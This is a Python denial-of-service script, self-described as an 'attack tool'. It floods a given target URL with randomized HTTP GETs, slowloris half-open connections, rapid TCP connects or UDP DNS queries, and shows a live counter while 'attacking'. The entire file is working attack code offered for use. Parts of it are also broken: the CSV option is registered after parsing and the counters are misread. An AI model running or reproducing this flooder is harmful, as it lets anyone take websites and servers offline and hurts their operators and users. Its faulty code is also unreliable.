import requests, threading, random, sys, time, signal, socket, argparse, csv, os

running = True
stats = {"sent": 0, "connections": 0}
lock = threading.Lock()
log_file = None

def handler(sig, frame):
    global running
    running = False

signal.signal(signal.SIGINT, handler)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; rv:97.0) Gecko/20100101 Firefox/97.0",
]
REFERERS = ["https://google.com/", "https://facebook.com/", "https://duckduckgo.com/"]

def mode_http(url, threads=50):
    def flood():
        while running:
            try:
                h = {"User-Agent": random.choice(USER_AGENTS), "Referer": random.choice(REFERERS)}
                requests.get(url + f"?{random.randint(100,999)}", headers=h, timeout=5)
                with lock: stats["sent"] += 1
            except: pass
    for _ in range(threads):
        threading.Thread(target=flood, daemon=True).start()
    return stats

def mode_slowloris(url, max_conns=500):
    raw = url.replace("http://","").replace("https://","").split("/")[0]
    host = raw.split(":")[0]
    port = int(raw.split(":")[1]) if ":" in raw else 80
    socks = []
    def connect():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4); s.connect((host, port))
            s.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\r\nHost: {host}\r\n".encode())
            return s
        except: return None
    def worker():
        while running:
            with lock:
                for s in socks[:]:
                    try: s.send(f"X-a: {random.randint(1,9999)}\r\n".encode())
                    except: socks.remove(s)
                while len(socks) < max_conns and running:
                    s = connect()
                    if s: socks.append(s)
                stats["connections"] = len(socks)
            time.sleep(5)
    for _ in range(20):
        threading.Thread(target=worker, daemon=True).start()
    return stats

def mode_syn_sim(url, threads=30):
    """Connection flood — rapid TCP opens, hold briefly, repeat."""
    raw = url.replace("http://","").replace("https://","").split("/")[0]
    host = raw.split(":")[0]
    port = int(raw.split(":")[1]) if ":" in raw else 80
    def syn():
        while running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2); s.connect((host, port))
                s.close()
                with lock: stats["sent"] += 1
            except: pass
    for _ in range(threads):
        threading.Thread(target=syn, daemon=True).start()
    return stats

def mode_dns_sim(target, threads=20):
    """Simulated DNS amplification — rapid UDP queries."""
    import struct
    raw = target.replace("http://","").replace("https://","").split("/")[0]
    host = raw.split(":")[0]
    def query():
        tid = random.randint(0,65535)
        q = struct.pack(">H", tid) + b"\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
        q += b"\x07example\x03com\x00\x00\x01\x00\x01"
        while running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.settimeout(1); s.sendto(q, (host, 53))
                with lock: stats["sent"] += 1
            except: pass
    for _ in range(threads):
        threading.Thread(target=query, daemon=True).start()
    return stats

parser = argparse.ArgumentParser(description="A2DoS — attack tool")
parser.add_argument("url", help="Target URL")
parser.add_argument("mode", nargs="?", default="http", choices=["http","slowloris","syn","dns"])
parser.add_argument("--threads", type=int, default=50)
parser.add_argument("--conns", type=int, default=500, help="Max connections (slowloris)")
args = parser.parse_args()

parser.add_argument("--csv", help="Save stats to CSV file")
modes = {"http": mode_http, "slowloris": mode_slowloris, "syn": mode_syn_sim, "dns": mode_dns_sim}
m = args.mode
if args.csv:
    log_file = open(args.csv, "w", newline="")
    w = csv.writer(log_file)
    w.writerow(["elapsed", "count", "rps"])
print(f"[{m}] Attacking {args.url} — Ctrl+C to stop")
print("=" * 40)
start = time.time()
modes[m](args.url, args.threads if m != "slowloris" else args.conns)
try:
    while running:
        elapsed = time.time() - start or 0.001
        n = stats.get("connections", stats["sent"])
        label = "Connections" if m == "slowloris" or m == "dns" else "Sent"
        if log_file:
            rps_log = n / elapsed
            w.writerow([f"{elapsed:.1f}", n, f"{rps_log:.0f}"])
        if m == "slowloris" or m == "dns":
            print(f"{label}: {n} | Elapsed: {elapsed:.0f}s", end="\r")
        else:
            print(f"Sent: {stats['sent']} | RPS: {stats['sent']/elapsed:.0f} | Elapsed: {elapsed:.0f}s", end="\r")
        time.sleep(0.5)
except KeyboardInterrupt:
    pass
elapsed = time.time() - start
n = stats.get("connections", stats["sent"])
if log_file:
    log_file.close()
    print(f"\nStats saved to {args.csv}")
print(f"\nDone. {label}: {n} in {elapsed:.0f}s")
